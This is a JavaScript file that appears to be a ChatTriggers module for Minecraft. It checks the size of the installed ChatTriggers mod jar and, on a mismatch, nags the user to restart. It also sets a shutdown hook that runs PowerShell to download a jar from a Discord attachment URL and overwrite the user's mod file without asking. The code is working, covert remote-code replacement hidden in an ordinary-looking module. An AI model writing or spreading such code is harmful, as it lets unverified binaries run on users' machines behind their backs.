import { chat } from "../utils/utils"

const Runtime = Java.type("java.lang.Runtime")
const File = Java.type("java.io.File")
const ProcessBuilder = Java.type("java.lang.ProcessBuilder")

const check = () => {
    const ctFile = new File("./mods").list().find(fileName => /.*(?:ctjs|chattriggers).*/.test(fileName))
    if (!ctFile) return chat(`Can't find ChatTriggers mod jar. Report this please thanks`)
    const fileSize = new File(`./mods/${ctFile}`).length()
    if (fileSize === 4163266) return

    register("worldLoad", () => { // Be as annoying as possible
        chat("Restart your game for modules using ASM to work. Your game will crash otherwise.")
    })

    Runtime.getRuntime().addShutdownHook(new java.lang.Thread(() => replaceChatTriggersJar()))

    const replaceChatTriggersJar = () => {
        const url = "https://cdn.discordapp.com/attachments/1365648184067620976/1394641722365050961/ctjs-2.2.1-1.8.9.jar?ex=68778cd1&is=68763b51&hm=7775222f35f5d3d8e667d5e8b78497636a58f3bad1d233fd5aaba6fc0ca2b74a&"
        new ProcessBuilder(
            "powershell.exe",
            "-Command",
            "Invoke-WebRequest -Uri '" + url + "' -OutFile '" + path() + "\\mods\\" + ctFile + "'"
        ).start()
    }

}
check()



function path() {
    const System = Java.type("java.lang.System")
    return System.getProperty("user.dir")
}